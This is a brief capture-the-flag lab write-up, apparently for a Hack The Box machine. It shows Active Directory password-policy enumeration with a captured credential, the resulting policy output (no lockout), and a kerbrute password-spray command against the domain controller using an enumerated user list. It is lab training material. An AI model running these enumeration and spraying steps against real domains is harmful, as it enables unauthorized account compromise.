# Password policy enumeration
```$ python enum_policy.py support.htb 'support\support' 'Ironside47pleasure40Watchful'```
```
##################################
# Domain name: DC=support,DC=htb #
##################################
-------------------------------
[b'[LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb;0]']
lockoutThreshold: [b'0']
lockoutDuration: [b'-18000000000']
minPwdAge: [b'-864000000000']
maxPwdAge: [b'-9223372036854775808']
minPwdLength: [b'7']
modifiedCount: [b'1']
```
# Password Spray

```$ kerbrute passwordspray -d support.htb --dc 10.10.11.174 loot/users.txt 'Ironside47pleasure40Watchful'```

```loot/users.txt```
```
Administrator
Guest
krbtgt
ldap
support
ford.victoria
```
